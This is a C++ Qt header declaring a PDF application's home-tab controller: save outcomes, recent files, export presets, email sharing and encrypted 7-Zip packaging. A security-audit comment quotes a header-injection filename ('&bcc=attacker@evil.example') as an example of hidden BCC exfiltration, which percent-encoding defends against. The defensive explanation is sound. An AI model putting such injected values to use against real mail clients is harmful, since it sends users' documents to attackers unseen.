// SPDX-License-Identifier: Apache-2.0
#pragma once

#include <QObject>
#include <QString>
#include <QStringList>
#include "core/ToolId.h"
#include "core/interfaces/IToolController.h"
#include "ui/ExportPresetsPanel.h" // Preset (§9.16 export-preset plan seam)

struct AppContext;
class PdfViewerWidget;

namespace gp {

class MainWindow;

class HomeController : public QObject, public IToolController {
    Q_OBJECT
public:
    // ARC03 (TEAM-ARCHITECTURE-REVIEW-2026-09-07): explicit save outcomes.
    // "Save initiated" is not proof of persistence — close/switch guards need
    // to know whether the work is really on disk.
    //   Saved    — the checked commit succeeded (dirty flag cleared).
    //   Canceled — nothing was attempted (no document open, user backed out).
    //   Failed   — a guard or the write itself failed; the work is untouched.
    enum class SaveOutcome { Saved, Canceled, Failed };

    HomeController(const AppContext* ctx, MainWindow* mainWindow, QObject* parent = nullptr);

    // IToolController
    QList<ToolId> handledTools() const override;
    void activate(ToolId id) override;
    // ARC07: shared read-only gate — Save (in place) reports disabled while
    // the session is read-only; Save As / Open / Print / Share stay enabled.
    bool isEnabled(ToolId id) const override;

    // ARC03: the save operation with an explicit, checked result for the
    // close/document-switch guards. ToolId::Save routes through here too.
    SaveOutcome saveNow();

    void addRecentFile(const QString& filePath);
    void removeFromRecents(const QString& filePath);
    int  pruneMissingRecents();
    QStringList recentFiles() const;

    // §9.16 test seam: map an export preset onto the concrete post-processing
    // steps the export flow will run (linearize → qpdf-backed
    // linearizeDocument; PDF/A → exportPdfA). Pure function so the preset
    // execution path can be tested without a document or dialogs.
    struct ExportPlan {
        bool linearize = false;
        int  pdfALevel = 0;   // 0 = no PDF/A step; else 1/2/3 (b-conformance)
    };
    static ExportPlan planForExport(const ExportPresetsPanel::Preset& p);

    // M-2 (AUDIT-SECURITY-2026-09-25, CWE-93) test seam, same pure-function
    // status as planForExport: composes the non-MAPI mailto share URL with
    // BOTH interpolations percent-encoded (QUrl::toPercentEncoding). The
    // filename/document metadata reaching `subject` is attacker-influenceable
    // (a hostile document name like "q1 report&bcc=attacker@evil.example.pdf"
    // or a CR/LF payload); unencoded interpolation let the mail client parse
    // injected headers (hidden BCC exfiltration). Encoded, a hostile payload
    // degrades to visible subject text. Never call QDesktopServices with an
    // unencoded mailto built from document data.
    static QString shareEmailUrl(const QString& subject, const QString& body);

    // M-1 (AUDIT-SECURITY-2026-09-25, CWE-214) test seams, same pure-function
    // status as planForExport/shareEmailUrl: the encrypted-package 7-Zip
    // argument vectors. The package password NEVER travels on the command
    // line — verified against the shipped 7-Zip 26.02 console behavior
    // (evidence-m1-package-argv): `7z a ... -p` with an EMPTY password value
    // prompts on stdin ("Enter password (will not be echoed)") and accepts a
    // piped reply, and `7z t <archive>` with NO -p switch prompts the same
    // way for an encrypted archive (a bare `-p` on `t` is parsed as an EMPTY
    // password — the read-back must omit the switch). The caller delivers the
    // password via SafeSave::runBoundedProcess's stdinData.
    static QStringList encryptedPackageCreateArgs(const QString& candidate,
                                                  const QString& filePath);
    static QStringList encryptedPackageValidateArgs(const QString& candidate);
    // The 7-Zip locator is its own unit: gp::SevenZipLocator (PARITY-SCORECARD
    // §4 row 14) — the vendored app-owned pair beside the executable is the
    // only resolution (F-02: no system-install fallback), empty = disclose.

private:
    void onSave();
    void onSaveAs();
    void onShare();
    void shareViaEmail(const QString& filePath);
    void createEncryptedPackage(const QString& filePath);
    void onPrint();
    void onPrintPreview();
    void onPageSetup();
    void onExportPresets();
    void showProperties();
    void onImportOffice();
    void onImagesToPdf();

    const AppContext* _ctx = nullptr;
    MainWindow* _mainWindow = nullptr;
};

} // namespace gp
